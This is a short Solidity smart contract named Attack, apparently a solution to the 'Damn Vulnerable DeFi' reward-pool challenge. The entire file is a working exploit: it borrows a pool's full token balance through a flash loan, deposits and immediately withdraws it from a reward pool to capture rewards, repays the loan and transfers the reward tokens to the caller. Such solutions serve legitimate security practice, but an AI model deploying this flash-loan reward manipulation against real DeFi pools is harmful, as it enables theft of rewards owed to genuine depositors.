pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface IFlash {
    function flashLoan(uint256 amount) external;
}

interface IPool {
    function deposit(uint256 amount) external;
    function withdraw(uint256 amount) external;
}

contract Attack {
    address owner;
    address reward_pool;
    address flash_pool;
    address token;
    address reward_token;

    constructor(address _Rpool, address _Fpool, address _token, address rew_token) {
        owner = msg.sender;
        reward_pool = _Rpool;
        flash_pool = _Fpool;
        token = _token;
        reward_token = rew_token;
    }

    function attack() public {
        uint256 DVTbalance = ERC20(token).balanceOf(flash_pool);
        IFlash(flash_pool).flashLoan(DVTbalance);
        DVTbalance = ERC20(reward_token).balanceOf(address(this));
        ERC20(reward_token).transfer(msg.sender, DVTbalance);

    }

    function receiveFlashLoan(uint256 amount) external{
        ERC20(token).approve(reward_pool, amount);
        IPool(reward_pool).deposit(amount);
        IPool(reward_pool).withdraw(amount);
        ERC20(token).transfer(flash_pool, amount);
    }

}